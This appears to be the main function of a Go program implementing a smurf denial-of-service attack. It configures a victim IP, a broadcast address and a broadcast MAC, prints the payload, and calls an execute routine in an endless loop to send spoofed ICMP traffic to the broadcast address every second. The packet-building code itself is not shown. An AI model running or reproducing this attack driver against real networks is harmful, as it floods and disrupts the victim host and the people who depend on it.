package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"time"
)

const banner = "Victim: %s\nICMP to: %s\nRun Every: %s\nPayload:\n---\n%v---\n"

func main() {
	conf := config{
		victim:     net.IP{192, 168, 1, 44},
		proxy:      net.IP{192, 168, 1, 255},
		gatewayMAC: net.HardwareAddr{255, 255, 255, 255, 255, 255},
		iface:      "en0",
	}
	s, err := newSmurf(conf)
	if err != nil {
		log.Fatal(err)
	}

	interval := time.Millisecond * 1000
	fmt.Printf(banner, conf.victim, conf.proxy, interval.String(), hex.Dump(s.payload))
	for {
		if err = s.execute(); err != nil {
			log.Fatal(err)
		}
		time.Sleep(interval)
	}
}
